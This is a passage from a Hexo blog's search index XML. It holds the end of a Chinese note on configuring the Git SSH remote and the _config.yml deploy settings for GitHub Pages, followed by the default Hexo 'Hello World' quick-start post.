class="hljs-selector-class">.git</span><br>官网给你的SSH连接地址是：github<span class="hljs-selector-class">.com</span>:Hooahhh/hexo-theme-fluid.git，需要手动修改<br></code></pre></td></tr></tbody></table></figure><h3 id="配置配置文件"><a href="#配置配置文件" class="headerlink" title="配置配置文件"></a>配置配置文件</h3><p>这一步是配置Hexo的配置文件的内容，与上文已无关系，在此做个记录。</p><p>Hexo文件下的_config.yml文件就是Hexo主要的配置文件，要想将内容配置到对应的仓库，配置文件修改如下：</p><figure class="highlight dts"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">deploy:</span><br><span class="hljs-symbol">  type:</span> git<br><span class="hljs-symbol">  repository:</span> git@hnkey.github.com:Hnkey/hnkey.github.io.git<br><span class="hljs-symbol">  branch:</span> master<br>  <span class="hljs-meta">#需要注意的是，比如type: git之间有个空格</span><br></code></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>计算机和网络技能</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/posts/20230526-4a17b156.html"/>
    <url>/posts/20230526-4a17b156.html</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">"My New Post"</span><br></code></pre></td></tr></tbody></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></tbody></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></tbody></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></tbody></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    <categories>
      
      <category>计算机和网络技能</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
